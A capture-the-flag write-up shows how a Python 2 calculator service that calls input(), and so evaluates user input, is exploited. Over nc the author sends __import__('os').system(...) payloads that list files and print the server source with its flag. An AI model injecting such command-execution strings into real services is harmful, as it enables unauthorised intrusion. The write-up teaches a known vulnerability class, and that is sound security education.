# My first calculator
Category: Miscellaneous

## Description
> I created this amazing calculator in python 2, take a look and tell me what you think

## Solution

We receive access to a Python 2 calculator:
```console
root@kali:/media/sf_CTFs/technion/My_first_calculator# nc ctf.cs.technion.ac.il 4012
Enter calculation: 1+1
 2
```

In Python 2 there are two methods to read input from the user: `input` and `raw_input`. This is what the docs say about `input`:

> Equivalent to eval(raw_input(prompt)).
> 
> Warning
> 
> This function is not safe from user errors! It expects a valid Python expression as input; if the input is not syntactically valid, a SyntaxError will be raised. Other exceptions may be raised if there is an error during evaluation. (On the other hand, sometimes this is exactly what you need when writing a quick script for expert use.) 

So if we are lucky, the calculator is using `input`, allowing us to evaluate Python expressions.

Let's try it:
```console
root@kali:/media/sf_CTFs/technion/My_first_calculator# nc ctf.cs.technion.ac.il 4012
Enter calculation: __import__('os').system('ls')
server.py
 0
```

Let's read `server.py`:

```console
root@kali:/media/sf_CTFs/technion/My_first_calculator# nc ctf.cs.technion.ac.il 4012
Enter calculation: __import__('os').system('cat server.py')
import sys
# cstechnion{d0nt_us3_1nput_in_pyth0n_2}

try:
        while 1:
                print("Enter calculation: "),
                sys.stdout.flush()
                calculation = input()
                print(calculation)
except:
        print("calculator turning off...")
        sys.stdout.flush()
 0
```

The flag: `cstechnion{d0nt_us3_1nput_in_pyth0n_2}`. Don't use Python 2 either.